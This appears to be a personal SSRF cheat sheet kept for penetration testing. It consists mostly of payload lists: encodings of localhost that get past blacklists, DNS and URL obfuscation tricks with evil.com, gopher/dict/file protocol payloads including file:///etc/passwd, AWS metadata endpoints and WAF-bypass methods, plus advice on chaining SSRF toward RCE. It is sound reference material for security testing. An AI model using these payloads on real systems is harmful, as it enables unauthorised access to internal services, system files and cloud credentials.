?url=ssrf

2 types : regular,blind

http//:api => admin
http//:api => 192.168.0.x:8080/admin : intruder l9ina x 

blacklist : localhost=127.0.0.1=127.1=.......
do not forget url encoding

open redirection 

?URL= file:///, dict://, ftp://, gopher://

##### amazing resource : 

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

# ğŸ“¡ SSRF (Server-Side Request Forgery) 

## ğŸ” What is SSRF?

SSRF occurs when an attacker tricks a server into making HTTP requests on their behalf. This can lead to : 

- Internal network access (e.g. `localhost`, `127.0.0.1`)

- Access to cloud metadata (`169.254.169.254`)

- Port scanning internal services

- Possible Remote Code Execution (RCE) in some cases


## âœ… SSRF Test Payloads

  

- 127.0.0.1
- localhost
- 169.254.169.254 Â  Â  Â  Â  Â  # AWS Metadata
- [::1] Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  # IPv6 localhost
- 0.0.0.0
- 2130706433 Â  Â  Â  Â  Â  Â  Â  Â # Decimal (127.0.0.1)
- 0177.1 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â # Octal (127.0.0.1)
- 127.1
- 12130706433 Â  Â  Â  Â  Â # Decimal
- 0x7f000001 Â  Â  Â  Â  Â # Hex
- 0177.0.0.1 Â  Â  Â  Â  Â # Octal
- 127.000.000.001 Â  Â  # Padded
- 127.0.1
- [::ffff:127.0.0.1] Â  Â  Â  Â # IPv6-mapped IPv4
- [::]
- [0000::1]
- [0:0:0:0:0:ffff:127.0.0.1]
- [::ffff:127.0.0.1]


### âœ… DNS Tricks : 

- localhost.localdomain

- localhost.bypass.com

- 127.0.0.1.nip.io

- 127.0.0.1.xip.io

### âœ… URL Obfuscation : 

- 127.0.0.1#evil.com

- 127.0.0.1@evil.com

- evil.com@127.0.0.1

- localhost%00.evil.com

- localhost%2f@evil.com

- 127.0.0.1%2F.. Â  Â  Â  Â  Â  Â 



### âœ… Protocol Confusion


- gopher://127.0.0.1:3306/_DATA

- ftp://127.0.0.1

- file:///etc/passwd

- dict://127.0.0.1
  
---

## ğŸ”¥ SSRF to AWS Metadata

- 169.254.169.254/latest/meta-data/

- [::ffff:169.254.169.254]/latest/meta-data/

- 0xA9FEA9FE Â  Â  Â  Â  Â  Â  Â  Â # Decimal of 169.254.169.254
---

  

## âš ï¸ WAF Bypass Ideas : 



- URL encoding Â  Â  : `localhost%2f..%2fadmin` Â  Â  Â  Â  Â 

-  Case variation Â  Â  : `LOcaLhOst`, `MetA-Data` Â  Â  Â  Â  Â  Â  Â  

-  Null bytes Â  Â  Â  Â  Â : `localhost%00.example.com` Â  Â  Â  Â  Â  Â  

- Host header abuse Â  Â :  Add `Host: 127.0.0.1` in SSRF requests Â 


---

  
- Combine SSRF with open redirect or DNS rebinding to enhance impact.

- SSRF can lead to RCE if targeting internal services .
---



https://highon.coffee/blog/ssrf-cheat-sheet/